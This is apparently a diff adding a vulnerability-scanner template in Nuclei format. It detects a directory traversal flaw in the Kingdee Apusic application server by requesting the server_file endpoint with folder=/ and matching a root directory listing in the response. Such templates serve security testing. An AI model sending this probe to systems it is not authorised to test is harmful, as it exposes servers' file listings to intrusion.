@@ -1,0 +1,21 @@
+id: apusic-server-file-directory-traversal
+info:
+  name: 金蝶OA Apusic应用服务器(中间件) server_file 目录遍历漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: directory-traversal
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin/protected/selector/server_file/files?folder=/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"name\":"
+          - "\"folder\":true"
+          - "\"path\""
